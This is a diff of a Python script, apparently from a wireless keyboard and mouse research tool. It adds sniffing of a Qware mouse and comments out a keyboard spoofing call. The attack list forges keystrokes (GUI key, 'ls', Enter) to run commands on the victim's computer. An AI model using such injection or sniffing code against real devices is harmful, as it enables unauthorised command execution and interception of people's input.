@@ -39,6 +39,7 @@ from devices.Edenwood.edenwood_mouse import Edenwood_Mouse
 from devices.Edenwood.edenwood_keyboard import Edenwood_Keyboard
 from devices.Cherry.cherry_mouse import Cherry_Mouse
 from devices.Qware.qware_keyboard import Qware_Keyboard
+from devices.Qware.qware_mouse import Qware_Mouse
 
 
 common.init_args('./main.py')
@@ -168,7 +169,11 @@ cherry_mouse = Cherry_Mouse("ac:da:da:96", 0x11021, 0x3c32)
 """
 
 qware_keyboard = Qware_Keyboard("3d:99:52:9c", 0x11021, 0xc5c5)
+qware_mouse= Qware_Mouse("3d:99:52:9c:11", 0x11021, 0x784e)
+
 #qware_keyboard.sniff()
+qware_mouse.sniff()
+
 attack_qware_keyboard = [
     qware_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
     lambda: time.sleep(1),
@@ -179,4 +184,5 @@ attack_qware_keyboard = [
     qware_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
     qware_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
 ]
-qware_keyboard.spoof(attack_qware_keyboard)
+
+#qware_keyboard.spoof(attack_qware_keyboard)
